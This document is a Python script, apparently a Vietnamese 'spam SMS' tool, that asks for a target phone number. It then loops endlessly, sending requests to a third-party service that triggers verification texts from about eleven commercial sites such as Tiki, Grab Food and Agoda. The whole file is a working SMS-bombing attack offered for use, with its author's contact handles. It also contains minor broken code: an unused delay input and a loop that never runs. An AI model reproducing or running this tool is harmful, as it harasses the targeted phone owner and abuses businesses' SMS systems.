from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from calendar import weekheader
from time import sleep
import requests
stt=0
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')  
logo=""" LIKE-TOOL
VERSION SPAM SMS
MAKE BY DMK!!!
FB : facebook.com/dmk.dz.208
zalo : 0325632051
"""      
print(Colorate.Diagonal(Colors.green_to_yellow, Center.XCenter(logo)))      
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; greenmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
Write.Print('IP của bạn: '+ip+'\n' ,Colors.green_to_yellow, interval=0.005)
Write.Print('Vị Trí: '+loc+'\n' ,Colors.green_to_yellow, interval=0.005)
phone=Write.Input("Nhập SDT (Lưu Ý Bỏ Số 0 Ở Đầu): " ,Colors.green_to_yellow, interval=0.005)
time_delay = Write.Input('Time Delay: ' ,Colors.green_to_yellow, interval=0.005)
while True:
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/the-gioi-di-dong?phone={phone}')  
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/nhap-hang-247?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/elines?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/meta-vn?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/bach-hoa-xanh?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/grab-food?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/tiki?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/go2joy?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vntrip?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/agoda?phone={phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    
    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')
    Write.Print(f"[{stt}] [LIKE-TOOL] => Done!"+" "+phone+"\n" ,Colors.green_to_yellow, interval=0.005)
    for i in range(120, 0):
            print(f"fb.com/dmk.dz.208 {i}\r")